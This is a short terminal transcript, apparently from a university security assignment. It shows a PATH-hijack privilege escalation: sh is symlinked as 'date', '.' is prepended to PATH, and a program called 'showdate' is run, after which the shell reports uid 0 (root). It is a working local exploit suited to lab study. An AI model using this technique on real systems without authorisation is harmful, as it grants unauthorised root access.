...
```
hendrik ~/uni/assignment4 % id                                                        [master]
uid=1000(hendrik) gid=100(users) groups=100(users),10(wheel),90(network),92(audio),93(optical),95(storage),98(power)
hendrik ~/uni/assignment4 % ln -s $(which sh) date && PATH=.:$PATH ./showdate         [master]
root ~/uni/assignment4 $ id
uid=0(root) gid=0(root) groups=0(root),10(wheel),90(network),92(audio),93(optical),95(storage),98(power),100(users)
```
